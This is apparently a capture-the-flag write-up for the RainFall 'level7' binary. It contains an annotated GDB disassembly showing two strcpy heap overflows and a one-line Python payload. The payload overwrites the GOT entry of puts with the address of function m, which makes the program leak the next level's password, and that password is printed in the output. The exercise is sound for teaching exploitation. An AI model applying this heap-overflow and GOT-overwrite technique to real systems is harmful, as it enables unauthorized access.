# level7

> We use [GDB peda](https://github.com/longld/peda) in order to get a better GDB visualization.

1. [Analysis](#analysis)
2. [Exploit](#exploit)

## Analysis

```gdb
gdb-peda$ disas main
Dump of assembler code for function main:
   0x08048521 <+0>:      push   ebp
   0x08048522 <+1>:      mov    ebp,esp
   0x08048524 <+3>:      and    esp,0xfffffff0
   0x08048527 <+6>:      sub    esp,0x20
   0x0804852a <+9>:      mov    DWORD PTR [esp],0x8             ; load 1st malloc arg (8)
   0x08048531 <+16>:     call   0x80483f0 <malloc@plt>          ; malloc(8)
   0x08048536 <+21>:     mov    DWORD PTR [esp+0x1c],eax        ; struct1 = malloc return value (0x804a008)
   0x0804853a <+25>:     mov    eax,DWORD PTR [esp+0x1c]        ; eax = struct1
   0x0804853e <+29>:     mov    DWORD PTR [eax],0x1             ; 1st variable of struct1 (int) = 1
   0x08048544 <+35>:     mov    DWORD PTR [esp],0x8             ; load 1st malloc arg (8)
   0x0804854b <+42>:     call   0x80483f0 <malloc@plt>          ; malloc(8)
   0x08048550 <+47>:     mov    edx,eax                         ; edx = malloc return value (0x0804a018)
   0x08048552 <+49>:     mov    eax,DWORD PTR [esp+0x1c]        ; eax = struct1
   0x08048556 <+53>:     mov    DWORD PTR [eax+0x4],edx         ; 2nd variable of struct1 = 0x0804a018
   0x08048559 <+56>:     mov    DWORD PTR [esp],0x8             ; load 1st malloc arg (8)
   0x08048560 <+63>:     call   0x80483f0 <malloc@plt>          ; malloc(8)
   0x08048565 <+68>:     mov    DWORD PTR [esp+0x18],eax        ; struct2 = malloc return value (0x804a028)
   0x08048569 <+72>:     mov    eax,DWORD PTR [esp+0x18]        ; eax = struct2
   0x0804856d <+76>:     mov    DWORD PTR [eax],0x2             ; 1st variable of struct2 (int) = 2
   0x08048573 <+82>:     mov    DWORD PTR [esp],0x8             ; load 1st malloc arg (8)
   0x0804857a <+89>:     call   0x80483f0 <malloc@plt>          ; malloc(8)
   0x0804857f <+94>:     mov    edx,eax                         ; edx = malloc return value (0x0804a038)
   0x08048581 <+96>:     mov    eax,DWORD PTR [esp+0x18]        ; eax = struct2
   0x08048585 <+100>:    mov    DWORD PTR [eax+0x4],edx         ; 2nd variable of struct2 = 0x0804a038
   0x08048588 <+103>:    mov    eax,DWORD PTR [ebp+0xc]         ; eax = argv
   0x0804858b <+106>:    add    eax,0x4                         ; eax += 4 (argv[1] offset)
   0x0804858e <+109>:    mov    eax,DWORD PTR [eax]             ; eax = argv[1]
   0x08048590 <+111>:    mov    edx,eax                         ; edx = argv[1]
   0x08048592 <+113>:    mov    eax,DWORD PTR [esp+0x1c]        ; eax = struct1
   0x08048596 <+117>:    mov    eax,DWORD PTR [eax+0x4]         ; eax = 2nd variable of struct1
   0x08048599 <+120>:    mov    DWORD PTR [esp+0x4],edx         ; load 2nd strcpy arg (argv[1])
   0x0804859d <+124>:    mov    DWORD PTR [esp],eax             ; load 1st arg of strcpy (2nd var of struct1)
   0x080485a0 <+127>:    call   0x80483e0 <strcpy@plt>          ; strcpy(2nd var of struct1, argv[1])
   0x080485a5 <+132>:    mov    eax,DWORD PTR [ebp+0xc]         ; eax = argv
   0x080485a8 <+135>:    add    eax,0x8                         ; eax += 8 (argv[2] offset)
   0x080485ab <+138>:    mov    eax,DWORD PTR [eax]             ; eax = argv[2]
   0x080485ad <+140>:    mov    edx,eax                         ; edx = argv[2]
   0x080485af <+142>:    mov    eax,DWORD PTR [esp+0x18]        ; eax = struct2
   0x080485b3 <+146>:    mov    eax,DWORD PTR [eax+0x4]         ; eax = 2nd var of struct2
   0x080485b6 <+149>:    mov    DWORD PTR [esp+0x4],edx         ; load 2nd strcpy arg (argv[2]) to stack
   0x080485ba <+153>:    mov    DWORD PTR [esp],eax             ; load 1st strcpy arg (2nd var of struct2) to stack
   0x080485bd <+156>:    call   0x80483e0 <strcpy@plt>          ; strcpy(2nd var of struct2, argv[2])
   0x080485c2 <+161>:    mov    edx,0x80486e9                   ; edx = 0x80486e9 (contains "r")
   0x080485c7 <+166>:    mov    eax,0x80486eb                   ; eax = 0x80486eb (contains "/home/user/level8/.pass")
   0x080485cc <+171>:    mov    DWORD PTR [esp+0x4],edx         ; load 2nd fopen arg to stack
   0x080485d0 <+175>:    mov    DWORD PTR [esp],eax             ; load 1st fopen arg to stack
   0x080485d3 <+178>:    call   0x8048430 <fopen@plt>           ; fopen("/home/user/level8/.pass", "r")
   0x080485d8 <+183>:    mov    DWORD PTR [esp+0x8],eax         ; load 3rd fgets arg to stack (fopen return value)
   0x080485dc <+187>:    mov    DWORD PTR [esp+0x4],0x44        ; load 2nd fgets arg (68)
   0x080485e4 <+195>:    mov    DWORD PTR [esp],0x8049960       ; load 1st fgets arg (.bss variable ?)
   0x080485eb <+202>:    call   0x80483c0 <fgets@plt>           ; fgets(.bss variable ?, 68, filestream)
   0x080485f0 <+207>:    mov    DWORD PTR [esp],0x8048703       ; load puts arg ("~~")
   0x080485f7 <+214>:    call   0x8048400 <puts@plt>            ; puts("~~")
   0x080485fc <+219>:    mov    eax,0x0
   0x08048601 <+224>:    leave
   0x08048602 <+225>:    ret
End of assembler dump.
```

```gdb
gdb-peda$ disas m
Dump of assembler code for function m:
   0x080484f4 <+0>:     push   ebp
   0x080484f5 <+1>:     mov    ebp,esp
   0x080484f7 <+3>:     sub    esp,0x18
   0x080484fa <+6>:     mov    DWORD PTR [esp],0x0              ; load time arg (NULL)
   0x08048501 <+13>:    call   0x80483d0 <time@plt>             ; time(NULL)
   0x08048506 <+18>:    mov    edx,0x80486e0                    ; 0x80486e0 contains "%s - %d\n"
   0x0804850b <+23>:    mov    DWORD PTR [esp+0x8],eax          ; load 3rd printf arg to stack (time return value)
   0x0804850f <+27>:    mov    DWORD PTR [esp+0x4],0x8049960    ; load printf 2nd arg to stack
   0x08048517 <+35>:    mov    DWORD PTR [esp],edx              ; load 1st printf arg to stack
   0x0804851a <+38>:    call   0x80483b0 <printf@plt>           ; printf("%s - %d\n", .bss variable ?, time return value)
   0x0804851f <+43>:    leave
   0x08048520 <+44>:    ret
End of assembler dump.
```

## Exploit

```console
level7@RainFall:~$ ./level7 `python -c 'print "A"*20 + "\x28\x99\x04\x08 " + "\xf4\x84\x04\x08"'`
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1524764276
```